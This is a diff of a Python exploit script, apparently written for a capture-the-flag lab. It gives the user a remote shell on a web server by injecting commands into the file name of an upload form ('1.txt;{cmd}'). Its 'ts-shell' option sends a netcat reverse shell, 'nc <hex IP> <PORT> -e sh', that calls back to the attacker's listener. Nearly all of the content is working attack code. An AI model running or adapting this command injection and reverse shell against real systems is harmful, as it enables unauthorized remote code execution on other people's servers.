@@ -42,15 +42,14 @@ elif len(sys.argv) == 3:
     global ip_port 
     ip_port = sys.argv[2]
 
-
-
 def sendCmd(cmd, ip):
     s = requests.Session()
     #burpproxy={"http":"http://127.0.0.1:8080"}
     fakeData = "fakedata".encode("ascii")
     data = {"file":(f"1.txt;{cmd}", fakeData, 'text/text'), "my-form":"Upload !"}
     #r = s.post("http://10.10.189.217/upload", files=data, proxies=burpproxy)
-    r = s.post(f"http://{ip}/upload", files=data, timeout=3)
+    url = f"http://{sys.argv[1]}/upload"
+    r = s.post(url, files=data, timeout=3)
     return r
 
 def printResults(text):
@@ -67,47 +66,42 @@ help()
 
 #Shell
 while True:
-    cmd = input(col.GREEN + "$: " +col.RESET)
-    if cmd == "ts-help":
-        commands()
-    if cmd == "ts-exit":
-        sys.exit(0)
-    if cmd == "ts-cls":
-        os.system("clear")
-        continue
-    if cmd == "ts-shell":
-        while True:
-            ans = input("Did you start the Listner? .. [y/n/q]: ")
-            ans = ans[0].lower()
-            if ans == '' or ans in ['y','Y','n','N','q']:
-                if ans == 'q':
-                    print("Quitting...")
-                    sys.exit(0)
-                if ans == 'n' or ans == 'N':
-                    continue
-                if ans == 'y' or ans == 'Y':
-                    break
-                print("Enter y or n ...")
-                sys.exit(0)
-            
-        ip = ip_port
-        ipp = ip.split(":")[0].split(".") #Hex-Encode the ip
-        ipp = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ipp))
-        bash = "nc <IP> <PORT> -e sh".replace("<IP>", "0x"+ ipp).replace("<PORT>", ip.split(":")[1])
-        cmd = bash
     try:
-        r = sendCmd(cmd, ip)    
+        cmd = input(col.GREEN + "$: " +col.RESET)
+        if cmd == "ts-help":
+            commands()
+        if cmd == "ts-exit":
+            sys.exit(0)
+        if cmd == "ts-cls":
+            os.system("clear")
+            continue
+        if cmd == "ts-shell":
+            while True:
+                ans = input("Did you start the Listner? .. [y/n/q]: ")
+                ans = ans[0].lower()
+                if ans == '' or ans in ['y','Y','n','N','q']:
+                    if ans == 'q':
+                        print("Quitting...")
+                        sys.exit(0)
+                    if ans == 'n' or ans == 'N':
+                        continue
+                    if ans == 'y' or ans == 'Y':
+                        break
+                    print("Enter y or n ...")
+                    sys.exit(0)
+                
+            ip = ip_port
+            ipp = ip.split(":")[0].split(".") #Hex-Encode the ip
+            ipp = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ipp))
+            bash = "nc <IP> <PORT> -e sh".replace("<IP>", "0x"+ ipp).replace("<PORT>", ip.split(":")[1])
+            cmd = bash        
+        
+        r = sendCmd(cmd, ip_port.split(":")[0])    
         printResults(r.text)
+
     except requests.Timeout as t:
         print(f"Error: Connection Timed out, Check you values!!\n\n{t}")
     except Exception as e:
         print(col.RED+ f"Error in output: {e}" + col.RESET)
         
     
-
-
-
-
-
-
-
